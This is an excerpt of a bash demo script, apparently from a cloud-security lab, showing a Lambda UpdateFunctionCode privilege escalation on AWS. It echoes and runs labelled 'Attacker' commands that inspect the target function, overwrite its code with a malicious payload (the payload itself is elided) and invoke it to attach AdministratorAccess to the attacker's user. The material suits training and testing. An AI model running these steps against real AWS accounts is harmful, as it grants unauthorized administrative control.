...
# Demo script for lambda:UpdateFunctionCode privilege escalation
...
TARGET_LAMBDA="pl-prod-lambda-003-to-admin-target-lambda"
TARGET_ROLE="pl-prod-lambda-003-to-admin-target-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Lambda UpdateFunctionCode Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"
...
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_lambda_003_lambda_updatefunctioncode.value // empty')
...
show_cmd "Attacker" "aws lambda get-function --region $AWS_REGION --function-name $TARGET_LAMBDA --output json"
...
# Step 9: Update Lambda function code (PRIVILEGE ESCALATION)
...
# Step 11: Invoke the malicious Lambda function
echo -e "${YELLOW}Step 11: Invoking Lambda function to attach admin policy${NC}"
echo "Invoking function: $TARGET_LAMBDA"

show_cmd "Attacker" "aws lambda invoke --region $AWS_REGION --function-name $TARGET_LAMBDA --payload '{}' /tmp/response.json --output json"
aws lambda invoke \
    --region $AWS_REGION \
    --function-name $TARGET_LAMBDA \
    --payload '{}' \
...
echo "4. Updated Lambda function code with malicious payload"
echo "5. Invoked Lambda function to attach AdministratorAccess to our user"
